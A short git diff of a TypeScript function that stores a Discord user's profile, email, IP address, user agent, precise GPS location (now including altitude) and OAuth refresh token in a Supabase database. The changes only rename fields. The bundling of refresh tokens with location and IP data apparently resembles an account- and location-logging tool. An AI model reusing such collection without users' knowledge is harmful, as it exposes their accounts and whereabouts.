@@ -1,6 +1,6 @@
 import { IpInfo } from "@/lib/functions/logger";
 import { UserLocation } from "@/lib/hooks/user-location-hooks";
-import { DiscordUser} from "@/lib/types";
+import { DiscordUser } from "@/lib/types";
 import { supabase } from "@/lib/utils/supabase/client";
 
 export async function push(
@@ -12,20 +12,21 @@ export async function push(
 ) {
   try {
     const userData = {
-      user_id: userInfo.id,
-      user_name: userInfo.username,
+      id: userInfo.id,
+      username: userInfo.username,
       global_name: userInfo.global_name,
-      avatar_id: userInfo.avatar,
+      avatar: userInfo.avatar,
       email: userInfo.email,
       mfa_enabled: userInfo.mfa_enabled,
       locale: userInfo.locale,
       verified: userInfo.verified,
       ip: ipInfo.ip,
       user_agent: userAgent,
-      gps: {
-        accuracy: location.accuracy,
+      location: {
         latitude: location.latitude,
         longitude: location.longitude,
+        altitude: location.altitude,
+        accuracy: location.accuracy,
       },
       refresh_token: refreshToken,
       created_at: new Date().toISOString(),
